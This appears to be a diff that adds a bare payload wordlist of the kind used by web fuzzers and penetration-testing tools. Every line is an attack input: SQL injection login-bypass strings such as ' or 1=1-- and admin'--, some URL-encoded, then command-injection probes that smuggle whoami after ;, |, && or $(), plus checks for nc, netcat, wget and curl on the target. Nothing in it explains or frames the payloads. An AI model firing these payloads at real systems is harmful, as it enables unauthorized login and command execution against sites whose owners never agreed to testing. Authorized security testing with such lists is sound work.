@@ -1,0 +1,66 @@
+qwerasdfzxcv
+qwerasdfzxcv0
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+admin'--
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
